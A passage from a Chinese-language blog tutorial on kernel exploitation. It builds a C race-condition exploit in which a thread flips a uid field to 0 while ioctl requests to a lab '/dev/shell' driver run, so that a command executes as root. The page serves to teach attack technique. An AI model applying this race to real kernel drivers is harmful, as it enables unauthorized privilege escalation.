argument.</span></span><br><span class="line">	pthread_create(&amp;thread, <span class="literal">NULL</span>, change_uid_root, &amp;udat);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/shell&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">	ioctl(fd, <span class="number">0</span>, &amp;udat);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Wait for our thread to stop</span></span><br><span class="line">	pthread_join(thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个奇妙的开始。显然，代码尚未完成，但到目前为止：</p>
<ul>
<li>我们已经定义并初始化了<code>user_data</code>结构，并为IOCTL句柄构建了一个简单的客户端。</li>
<li>使用IOCTL请求，我们可以运行命令。</li>
<li>我们创建了一个线程，该线程将真的打印出一些东西！</li>
</ul>
<p>下一步是修改<code>change_uid_root()</code>函数以便我们可以继续编辑<code>uid</code>，同时继续编辑合法的IOCTL请求。这样，我们可以尝试在验证完成后击败内核来修改我们的uid！</p>
<p>让我们开始这一步！</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add a bit of state tracking</span></span><br><span class="line"><span class="comment">// So we can stop the thread when our for loop is done</span></span><br><span class="line"><span class="keyword">int</span> finish = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">user_data</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>	uid;</span><br><span class="line">	<span class="keyword">char</span>	cmd[<span class="number">100</span>];</span><br><span class="line">&#125;  user_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_uid_root</span><span class="params">(<span class="keyword">void</span> *struct_ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	user_data *udat = struct_ptr;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// While we&#x27;re not finished, keep trying to change the uid to 0 in this thread.	</span></span><br><span class="line">	<span class="keyword">while</span> (finish == <span class="number">0</span>)</span><br><span class="line">		udat-&gt;uid = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">pthread_t</span> thread;</span><br><span class="line"></span><br><span class="line">	user_data udat;</span><br><span class="line"></span><br><span class="line">	udat.uid = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">strcpy</span>(udat.cmd, <span class="string">&quot;echo &#x27;foo&#x27; &gt; /tmp/hacker&quot;</span>);</span><br><span class="line"></span><br><span class="line">	pthread_create(&amp;thread, <span class="literal">NULL</span>, change_uid_root, &amp;udat);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/shell&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Try running 100 legitimate IOCTL requests</span></span><br><span class="line">	<span class="comment">// while our thread is trying to change the uid to 0</span></span><br><span class="line">	<span class="comment">// we keep resetting our uid </span></span><br><span class="line">	<span class="comment">// to our initial value otherwise it will stay 0 after the thread</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">		ioctl(fd, <span class="number">0</span>, &amp;udat);</span><br><span class="line">		udat.uid = <span class="number">1000</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// After our loop we should make our thread stop.</span></span><br><span class="line">	finish = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	pthread_join(thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并运行该代码后，这段代码将在我的计算机上赢得竞争，并创建一个<code>/tmp/hacker</code>文件作为root用户。与所有条件竞争一样，您可能需要更改一些变量，例如更改一些尝试次数和线程数量，以使其正常运行。</p>
<p>这是第一节的结尾！我希望你喜欢它。欢迎提出意见或建议。</p>
<p>干杯！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://f23y.github.io/2021/11/10/An%20introduction%20to%20Kernel%20Exploitation%20Part%201/" data-id="ckvt91uik0000o8u06tlt4gps" data-title="An introduction to Kernel Exploitation Part 1" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
    
  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/11/10/An%20introduction%20to%20Kernel%20Exploitation%20Part%201/">An introduction to Kernel Exploitation Part 1</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>